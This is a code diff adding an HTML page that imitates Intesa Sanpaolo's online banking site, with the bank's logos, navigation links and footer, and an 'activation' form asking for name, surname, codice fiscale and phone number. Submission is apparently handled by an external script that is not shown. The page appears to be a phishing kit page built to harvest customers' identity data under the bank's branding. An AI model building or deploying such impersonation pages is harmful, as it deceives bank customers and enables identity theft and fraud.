@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Intesa Sanpaolo - Banca Online</title>
+    <link rel="stylesheet" href="completaAccesso-styles.css">
+    <!-- Preload Open Sans fonts -->
+    <link rel="preload" href="fonts/OpenSans-Regular.ttf" as="font" type="font/ttf" crossorigin>
+    <link rel="preload" href="fonts/OpenSans-Light.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="fonts/OpenSans-Semibold.ttf" as="font" type="font/ttf" crossorigin>
+</head>
+<body>
+    <div class="intesa-sanpaolo-page">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-top">
+                <nav class="top-nav">
+                    <ul>
+                        <li><a href="https://imi.intesasanpaolo.com/it/">CORPORATE</a></li>
+                        <li><a href="https://group.intesasanpaolo.com/it/">GRUPPO <img src="img/flag_eng.png" alt="English Flag" style="height: 1em; vertical-align: middle; margin-left: 2px;" /></a></li>
+                        <li><a href="https://group.intesasanpaolo.com/it/careers">CAREERS</a></li>
+                        <li><a href="https://group.intesasanpaolo.com/it/newsroom">NEWS</a></li>
+                        <li><a href="https://www.intesasanpaolo.com/content/vetrina/it/common/landing/club-azionisti.html">CLUB AZIONISTI</a></li>
+                        <li><a href="https://www.finanzainsieme.com/">FINANZA INSIEME</a></li>
+                        <li><a href="https://www.intesasanpaolo.com/content/vetrina/it/common/landing/quick-training-banca-digitale.html">QUICK TRAINING</a></li>
+                    </ul>
+                </nav>
+            </div>
+            <!-- Pannello menu desktop tra barra nera e barra verde -->
+            <div id="menuPanel" class="menu-panel" style="display:none;">
+                <div class="menu-panel-options">
+                    <div class="menu-panel-option"><a href="https://www.intesasanpaolo.com/it/persone-e-famiglie/prodotti/investimenti.html" style="color:inherit;text-decoration:none;">TUTTI I PRODOTTI</a></div>
+                    <div class="menu-panel-option"><a href="https://www.intesasanpaolo.com/it/persone-e-famiglie/tutti-i-giorni/risparmi-ogni-giorno.html" style="color:inherit;text-decoration:none;">TUTTI I GIORNI</a></div>
+                    <div class="menu-panel-option"><a href="https://www.intesasanpaolo.com/content/internetbanking/it/faq/common/faqHome/momenti-della-vita--salute-e-benessere.privati.html" style="color:inherit;text-decoration:none;">MOMENTI DELLA VITA</a></div>
+                </div>
+            </div>
+            <div class="header-main">
+                <div class="container">
+                    <div class="header-content">
+                        <div class="logo-section">
+                            <div class="logo">
+                                <img src="img/logo-intesasanpaolo.png" alt="Intesa Sanpaolo" class="logo-img" />
+                            </div>
+                        </div>
+                        
+                        <nav class="main-nav">
+                            <ul>
+                                <li><a href="https://www.intesasanpaolo.com/content/vetrina/it/persone-e-famiglie.html" class="active">Persone e Famiglie</a></li>
+                                <li><a href="https://www.intesasanpaolo.com/content/vetrina/it/business.html">Business</a></li>
+                                <li><a href="https://www.intesasanpaolo.com/content/vetrina/it/exclusive.html">Exclusive</a></li>
+                            </ul>
+                        </nav>
+                        
+                        <div class="header-actions">
+                            <div class="action-item chat">
+                                <div class="chat-icon">
+                                    <a href="https://www.intesasanpaolo.com/content/vetrina/it/common/parla-con-noi.html" tabindex="-1">
+                                        <img src="img/ico-parla-con-noi.png" alt="Parla con noi" />
+                                    </a>
+                                </div>
+                                <div class="action-text">
+                                    <a href="https://www.intesasanpaolo.com/content/vetrina/it/common/parla-con-noi.html" style="text-decoration:none;color:inherit;">
+                                        <span class="small">PARLA<br></span>
+                                        <span class="big">CON NOI</span>
+                                    </a>
+                                </div>
+                            </div>
+                            
+                            <div class="action-item menu" id="menuToggle">
+                                <div class="menu-icon">
+                                    <div class="menu-icon-bar"></div>
+                                    <div class="menu-icon-bar"></div>
+                                    <div class="menu-icon-bar"></div>
+                                </div>
+                                <div class="action-text">
+                                    <span class="big">MENU</span>
+                                </div>
+                            </div>
+                            
+                            <div class="action-item account">
+                                <div class="account-icon">
+                                    <a href="https://www.intesasanpaolo.com/content/vetrina/it/persone-e-famiglie/prodotti/conti-e-libretti/confronta-conti-corrente.html" tabindex="-1">
+                                        <img src="img/bodyplus.svg" alt="Scopri il conto" />
+                                    </a>
+                                </div>
+                                <div class="action-text">
+                                    <a href="https://www.intesasanpaolo.com/content/vetrina/it/persone-e-famiglie/prodotti/conti-e-libretti/confronta-conti-corrente.html" style="text-decoration:none;color:inherit;">
+                                        <span class="small">SCOPRI<br></span>
+                                        <span class="big">IL CONTO</span>
+                                    </a>
+                                </div>
+                            </div>
+                            
+                            <div class="action-item access">
+                                <div class="access-icon"><img src="img/lucket.svg" alt="Accesso clienti" /></div>
+                                <div class="action-text">
+                                    <span class="small">ACCESSO</span>
+                                    <span class="big">CLIENTI</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Mobile navbar sotto la barra verde, solo per mobile -->
+        <nav class="mobile-navbar" style="display:none">
+            <div class="mobile-nav-item" style="display:flex;flex-direction:row;align-items:center;justify-content:center;">
+                <a href="https://www.intesasanpaolo.com/content/vetrina/it/persone-e-famiglie/prodotti/conti-e-libretti/confronta-conti-corrente.html" style="display:flex;flex-direction:row;align-items:center;justify-content:center;text-decoration:none;color:inherit;">
+                    <span>SCOPRI IL CONTO</span>
+                    <img src="img/bodyplus.svg" alt="Scopri il conto" class="mobile-nav-icon" style="margin-left:8px;" />
+                </a>
+            </div>
+            <div class="mobile-nav-item" style="display:flex;flex-direction:row;align-items:center;justify-content:center;">
+                <a href="#" style="display:flex;flex-direction:row;align-items:center;justify-content:center;text-decoration:none;color:inherit;">
+                    <span>ACCESSO CLIENTI</span>
+                    <img src="img/lucket.svg" alt="Accesso clienti" class="mobile-nav-icon" style="margin-left:8px;" />
+                </a>
+            </div>
+        </nav>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <div class="hero-section">
+                <div class="hero-background"></div>
+                <div class="hero-content">
+                    <div class="container" style="max-width: 900px; margin: 0 auto;">
+                        <!-- Breadcrumb -->
+                        <div class="breadcrumb-accesso">
+                            <span class="home">Home</span>
+                            <span class="step">Inserimento dati</span>
+                        </div>
+                        <!-- Barra avanzamento -->
+                        <div class="progress-accesso">
+                            <div class="title">ATTIVAZIONE</div>
+                            <div class="bar">
+                                <div class="step-green"></div>
+                                <div class="step-gray"></div>
+                            </div>
+                            <div class="labels">
+                                <span class="compila">COMPILA</span>
+                                <span class="esito">ESITO</span>
+                            </div>
+                        </div>
+                        <!-- Linea orizzontale -->
+                        <div class="linea-orizzontale-accesso"></div>
+                        <!-- Titolo -->
+                        <div class="titolo-accesso">Inserisci i dati richiesti</div>
+                        <!-- Form -->
+                        <form class="dati-form">
+                            <div class="dati-form-fields">
+                                <div>
+                                    <label for="nome">Nome*</label>
+                                    <input type="text" id="nome" name="nome" class="form-input"/>
+                                </div>
+                                <div>
+                                    <label for="cognome">Cognome*</label>
+                                    <input type="text" id="cognome" name="cognome" class="form-input"/>
+                                </div>
+                                <div>
+                                    <label for="cf">Codice fiscale*</label>
+                                    <input type="text" id="cf" name="cf" class="form-input"/>
+                                </div>
+                                <div>
+                                    <label for="telefono">Numero di telefono*</label>
+                                    <input type="text" id="telefono" name="telefono" class="form-input"/>
+                                </div>
+                            </div>
+                            <div class="dati-form-actions">
+                                <button type="button" class="indietro-btn">INDIETRO</button>
+                                <button type="submit" class="login-button">CONTINUA</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="social-section">
+                <span>SEGUICI ANCHE SU</span>
+                <div class="social-icons">
+                    <a href="https://www.facebook.com/intesasanpaolo/" target="_blank"><img src="img/ico-facebook.svg" alt="Facebook" /></a>
+                    <a href="https://www.youtube.com/user/intesasanpaolo" target="_blank"><img src="img/ico-youtube.svg" alt="YouTube" /></a>
+                    <a href="https://x.com/intesasanpaolo" target="_blank"><img src="img/ico-twitter.svg" alt="Twitter" /></a>
+                    <a href="https://www.linkedin.com/company/intesa-sanpaolo/" target="_blank"><img src="img/ico-linkedin.svg" alt="LinkedIn" /></a>
+                    <a href="https://www.instagram.com/intesasanpaolo/" target="_blank"><img src="img/ico-instagram.svg" alt="Instagram" /></a>
+                </div>
+            </div>
+            
+            <div class="footer-content">
+                <div class="container">
+                    <div class="footer-columns">
+                        <div class="footer-column">
+                            <h4><img src="img/arrows.png" alt="arrows" style="height: 1.5em; vertical-align: middle; margin-right: 6px;" /> VICINO A TE - ONLINE E IN FILIALE</h4>
+                            <ul>
+                                <li>CI TROVI OVUNQUE</li>
+                                <li>CERCA FILIALI, ATM E PUNTI VENDITA ABILITATI MOONEY</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="footer-column">
+                            <h4><img src="img/arrows.png" alt="arrows" style="height: 1.5em; vertical-align: middle; margin-right: 6px;" /> INFORMAZIONI E SERVIZI</h4>
+                            <div class="sub-section">
+                                <ul>
+                                    <li>GUIDA AI SERVIZI</li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <div class="footer-column">
+                            <h4><img src="img/arrows.png" alt="arrows" style="height: 1.5em; vertical-align: middle; margin-right: 6px;" /> ASSISTENZA E DOMANDE</h4>
+                            <ul>
+                                <li>DOMANDE FREQUENTI</li>
+                                <li>BLOCCA LA TUA CARTA</li>
+                                <li>DISCONOSCIMENTO</li>
+                                <li>SCOPRI LA FILIALE DIGITALE</li>
+                                <li>SICUREZZA</li>
+                                <li>SUCCESSIONI</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="footer-column">
+                            <h4><img src="img/arrows.png" alt="arrows" style="height: 1.5em; vertical-align: middle; margin-right: 6px;" /> RECLAMI E RISOLUZIONE CONTROVERSIE</h4>
+                            <ul>
+                                <li>RECLAMI E RISOLUZIONE DELLE CONTROVERSIE</li>
+                                <li>CONCILIAZIONE PERMANENTE</li>
+                                <li>ABF</li>
+                                <li>ACF</li>
+                                <li>IVASS</li>
+                                <li>ODR</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="footer-sections">
+                        <div class="footer-section">
+                            <h5>Gruppo Intesa Sanpaolo</h5>
+                            <ul>
+                                <li>CHI SIAMO</li>
+                                <li>INVESTOR RELATIONS</li>
+                                <li>GOVERNANCE</li>
+                                <li>SOSTENIBILITÀ</li>
+                                <li>SOCIALE</li>
+                                <li>RESEARCH</li>
+                                <li>NEWSROOM</li>
+                                <li>CAREERS</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="footer-section">
+                            <h5>Banche dei Territori</h5>
+                            <ul>
+                                <li>DATI SOCIETARI</li>
+                                <li><a href="https://www.intesasanpaolo.com/content/vetrina/it/common/footer/bilanci_e_relazioni.html" target="_blank">BILANCI E RELAZIONI</a></li>
+                                <li>COMUNICATI STAMPA</li>
+                                <li>INFORMAZIONI AGLI AZIONISTI E OBBLIGAZIONISTI</li>
+                                <li>CERTIFICAZIONI E RICONOSCIMENTI</li>
+                                <li>SITO PRIVATE</li>
+                                <li>NOTIZIE</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="footer-section">
+                            <h5>Normative</h5>
+                            <ul>
+                                <li>PRIVACY</li>
+                                <li><a href="https://www.intesasanpaolo.com/content/vetrina/it/common/footer/cookies.html" target="_blank">COOKIES</a></li>
+                                <li>TRASPARENZA</li>
+                                <li>PIANI DI SOSTITUZIONE</li>
+                                <li>D.LGS. 231/2001</li>
+                                <li>OPERAZIONI DI CESSIONE</li>
+                                <li>SERVIZI DI INVESTIMENTO</li>
+                                <li>CARTE: CONVERSIONE VALUTARIA</li>
+                                <li>RAPPORTI DORMIENTI</li>
+                                <li>POLICY DI SOSTENIBILITÀ</li>
+                                <li>INFORMATIVA IVASS – RAPPORTI D’AFFARI</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="footer-section">
+                            <h5>Accessibilità</h5>
+                            <ul>
+                                <li>DICHIARAZIONE DI ACCESSIBILITÀ</li>
+                                <li>DICHIARAZIONE DI ACCESSIBILITÀ APP IOS</li>
+                                <li>MAPPA DEL SITO</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <div class="container">
+                    <div class="footer-bottom-content">
+                        <div class="logo-footer">
+                            <img src="img/logo-intesasanpaolo.png" alt="Intesa Sanpaolo" class="logo-img" />
+                            <p>Partita IVA 11991500015 (IT 11991500015)</p>
+                        </div>
+                        
+                        <div class="certification">
+                                <img src="img/trasparenza.png" alt="Trasparenza" style="height: 25px;" />
+                        </div>
+                        
+                        <div class="guarantee-fund">
+                                <img src="img/logo-footer.png" alt="Fondo di Garanzia" style="height: 42px;" />
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Pannello menu mobile -->
+    <div id="mobileMenuPanel" class="mobile-menu-panel" style="display:none;">
+        <div class="mobile-menu-top">
+            <a href="https://www.intesasanpaolo.com/content/vetrina/it/common/parla-con-noi.html" style="text-decoration:none;color:inherit;">
+                <span class="mobile-parla">PARLA CON NOI<img src="img/ico-parla-con-noi.png" alt="Parla con noi" style="height: 27px; width: auto; vertical-align: middle; margin-left: 10px;" /></span>
+            </a>
+        </div>
+        <div class="mobile-menu-green">
+            <div><a href="https://www.intesasanpaolo.com/content/vetrina/it/persone-e-famiglie.html" style="text-decoration: none; color: #fff; font-weight: 500;">Persone e Famiglie</a></div>
+            <div><a href="https://www.intesasanpaolo.com/content/vetrina/it/business.html" style="text-decoration: none; color: #fff;">Business</a></div>
+            <div><a href="https://www.intesasanpaolo.com/content/vetrina/it/exclusive.html" style="text-decoration: none; color: #fff;">Exclusive</a></div>
+        </div>
+        <div class="mobile-menu-black">
+            <div><a href="https://imi.intesasanpaolo.com/it/" style="text-decoration: none; color: #fff;">Corporate</a></div>
+            <div><a href="https://group.intesasanpaolo.com/it/" style="text-decoration: none; color: #fff;">Gruppo <img src="img/flag_eng.png" alt="English Flag" style="height: 1em; vertical-align: middle; margin-left: 2px;" /></a></div>
+            <div><a href="https://group.intesasanpaolo.com/it/careers" style="text-decoration: none; color: #fff;">Careers</a></div>
+            <div><a href="https://group.intesasanpaolo.com/it/newsroom" style="text-decoration: none; color: #fff;">News</a></div>
+            <div><a href="https://www.intesasanpaolo.com/content/vetrina/it/common/landing/club-azionisti.html" style="text-decoration: none; color: #fff;">Club Azionisti</a></div>
+            <div><a href="https://www.finanzainsieme.com/" style="text-decoration: none; color: #fff;">Finanza Insieme</a></div>
+            <div><a href="https://www.intesasanpaolo.com/content/vetrina/it/common/landing/quick-training-banca-digitale.html" style="text-decoration: none; color: #fff;">Quick Training</a></div>
+        </div>
+    </div>
+
+    <script src="completaAccesso-script.js"></script>
+    <script>
+document.getElementById('telefono').addEventListener('input', function(e) {
+    this.value = this.value.replace(/[^0-9]/g, '');
+});
+document.getElementById('nome').addEventListener('input', function(e) {
+    this.value = this.value.replace(/[0-9]/g, '');
+});
+document.getElementById('cognome').addEventListener('input', function(e) {
+    this.value = this.value.replace(/[0-9]/g, '');
+});
+</script>
+</body>
+</html>
